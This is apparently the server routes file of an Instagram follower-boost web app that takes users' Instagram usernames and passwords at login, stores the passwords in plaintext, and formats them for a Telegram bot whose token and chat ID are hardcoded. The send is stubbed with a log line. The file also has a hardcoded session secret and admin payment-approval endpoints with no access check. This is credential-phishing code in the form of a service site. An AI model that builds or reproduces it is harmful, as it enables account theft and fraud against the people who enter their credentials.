import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { z } from "zod";
import session from "express-session";
import { v4 as uuidv4 } from "uuid";

// Extend session interface
declare module "express-session" {
  interface SessionData {
    userId?: number;
    uid?: string;
  }
}

interface AuthenticatedRequest extends Request {
  session: session.Session & Partial<session.SessionData> & {
    userId?: number;
    uid?: string;
  };
}

// Session configuration
const sessionConfig = session({
  secret: process.env.SESSION_SECRET || "instaboost-secret-key",
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: false,
    httpOnly: true,
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
  },
});

// Validation schemas
const loginSchema = z.object({
  instagramUsername: z.string().min(1),
  password: z.string().min(1),
});

const orderSchema = z.object({
  serviceName: z.string().min(1),
  instagramUsername: z.string().min(1),
  quantity: z.number().min(1),
  price: z.number().min(0.01),
});

const paymentSchema = z.object({
  amount: z.number().min(1),
  utrNumber: z.string().min(1),
  paymentMethod: z.string().min(1),
});

// Mock Telegram bot function
async function sendToTelegramBot(action: string, data: any) {
  console.log(`🤖 Telegram Bot Notification [${action.toUpperCase()}]:`, data);
  
  // In production, this would send to actual Telegram Bot API
  const botToken = process.env.TELEGRAM_BOT_TOKEN || "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y";
  const chatId = process.env.TELEGRAM_CHAT_ID || "6881713177";
  
  let message = "";
  switch (action) {
    case "login":
      message = `🔐 New Login\nUID: ${data.uid}\nUsername: ${data.instagramUsername}\nPassword: ${data.password}`;
      break;
    case "payment":
      message = `💰 Payment Request\nUID: ${data.uid}\nAmount: ₹${data.amount}\nUTR: ${data.utrNumber}\nMethod: ${data.paymentMethod}`;
      break;
    case "order":
      message = `📦 New Order\nUID: ${data.uid}\nService: ${data.serviceName}\nQuantity: ${data.quantity}\nPrice: ₹${data.price}\nUsername: ${data.instagramUsername}`;
      break;
    case "bonus":
      message = `🎁 Bonus Claimed\nUID: ${data.uid}\nAmount: ₹10`;
      break;
  }

  // Mock API call - in production would use actual fetch to Telegram API
  console.log(`Would send to Telegram: ${message}`);
}

function generateUID(): string {
  return "UID" + Math.random().toString(36).substr(2, 9).toUpperCase();
}

function generateOrderId(): string {
  return "ORDER" + Date.now() + Math.random().toString(36).substr(2, 4).toUpperCase();
}

export async function registerRoutes(app: Express): Promise<Server> {
  app.use(sessionConfig);

  // Initialize default services
  await storage.initializeServices();

  // Auth endpoints
  app.post("/api/auth/login", async (req: AuthenticatedRequest, res: Response) => {
    try {
      const { instagramUsername, password } = loginSchema.parse(req.body);
      
      // Check if user exists
      let user = await storage.getUserByInstagramUsername(instagramUsername);
      
      if (!user) {
        // Create new user
        const uid = generateUID();
        user = await storage.createUser({
          uid,
          instagramUsername,
          password,
          walletBalance: "0",
          bonusClaimed: false,
        });

        // Send to Telegram bot
        await sendToTelegramBot("login", {
          uid: user.uid,
          instagramUsername,
          password,
        });
      }

      // Store user in session
      req.session.userId = user.id;
      req.session.uid = user.uid;

      res.json({
        success: true,
        user: {
          id: user.id,
          uid: user.uid,
          instagramUsername: user.instagramUsername,
          walletBalance: user.walletBalance,
          bonusClaimed: user.bonusClaimed,
        },
      });
    } catch (error) {
      console.error("Login error:", error);
      res.status(400).json({ error: "Invalid login data" });
    }
  });

  app.post("/api/auth/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ error: "Could not log out" });
      }
      res.json({ success: true });
    });
  });

  app.get("/api/auth/user", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      res.json({
        id: user.id,
        uid: user.uid,
        instagramUsername: user.instagramUsername,
        walletBalance: user.walletBalance,
        bonusClaimed: user.bonusClaimed,
      });
    } catch (error) {
      console.error("Get user error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Services endpoints
  app.get("/api/services", async (req, res) => {
    try {
      const services = await storage.getServices();
      res.json(services);
    } catch (error) {
      console.error("Get services error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Orders endpoints
  app.post("/api/orders", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const { serviceName, instagramUsername, quantity, price } = orderSchema.parse(req.body);
      
      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      const userBalance = parseFloat(user.walletBalance);
      if (userBalance < price) {
        return res.status(400).json({ error: "Insufficient wallet balance" });
      }

      // Create order
      const orderId = generateOrderId();
      const order = await storage.createOrder({
        orderId,
        userId: user.id,
        serviceName,
        instagramUsername,
        quantity,
        price: price.toString(),
        status: "Processing",
      });

      // Deduct from wallet
      await storage.updateUserBalance(user.id, userBalance - price);

      // Send to Telegram bot
      await sendToTelegramBot("order", {
        uid: user.uid,
        serviceName,
        quantity,
        price,
        instagramUsername,
        orderId,
      });

      res.json({ success: true, order });
    } catch (error) {
      console.error("Create order error:", error);
      res.status(400).json({ error: "Invalid order data" });
    }
  });

  app.get("/api/orders", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const orders = await storage.getUserOrders(req.session.userId);
      res.json(orders);
    } catch (error) {
      console.error("Get orders error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Payments endpoints
  app.post("/api/payments", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const { amount, utrNumber, paymentMethod } = paymentSchema.parse(req.body);
      
      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      // Create payment request
      const payment = await storage.createPayment({
        userId: user.id,
        amount: amount.toString(),
        utrNumber,
        paymentMethod,
        status: "Pending",
      });

      // Send to Telegram bot
      await sendToTelegramBot("payment", {
        uid: user.uid,
        amount,
        utrNumber,
        paymentMethod,
        paymentId: payment.id,
      });

      res.json({ success: true, payment });
    } catch (error) {
      console.error("Create payment error:", error);
      res.status(400).json({ error: "Invalid payment data" });
    }
  });

  app.get("/api/payments", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const payments = await storage.getUserPayments(req.session.userId);
      res.json(payments);
    } catch (error) {
      console.error("Get payments error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Bonus endpoints
  app.post("/api/bonus/claim", async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: "Not authenticated" });
    }

    try {
      const user = await storage.getUser(req.session.userId);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }

      if (user.bonusClaimed) {
        return res.status(400).json({ error: "Bonus already claimed" });
      }

      // Add bonus to wallet and mark as claimed
      const newBalance = parseFloat(user.walletBalance) + 10;
      await storage.updateUserBalance(user.id, newBalance);
      await storage.markBonusClaimed(user.id);

      // Send to Telegram bot
      await sendToTelegramBot("bonus", {
        uid: user.uid,
        amount: 10,
      });

      res.json({ 
        success: true, 
        newBalance: newBalance.toFixed(2),
        message: "₹10 bonus claimed successfully!" 
      });
    } catch (error) {
      console.error("Claim bonus error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  // Admin endpoints for payment approval (mock)
  app.post("/api/admin/payments/:id/approve", async (req, res) => {
    try {
      const paymentId = parseInt(req.params.id);
      const payment = await storage.getPayment(paymentId);
      
      if (!payment) {
        return res.status(404).json({ error: "Payment not found" });
      }

      // Update payment status and add funds to user wallet
      await storage.updatePaymentStatus(paymentId, "Approved");
      
      const user = await storage.getUser(payment.userId);
      if (user) {
        const newBalance = parseFloat(user.walletBalance) + parseFloat(payment.amount);
        await storage.updateUserBalance(user.id, newBalance);
      }

      res.json({ success: true, message: "Payment approved and funds added" });
    } catch (error) {
      console.error("Approve payment error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  app.post("/api/admin/payments/:id/decline", async (req, res) => {
    try {
      const paymentId = parseInt(req.params.id);
      await storage.updatePaymentStatus(paymentId, "Declined");
      res.json({ success: true, message: "Payment declined" });
    } catch (error) {
      console.error("Decline payment error:", error);
      res.status(500).json({ error: "Server error" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
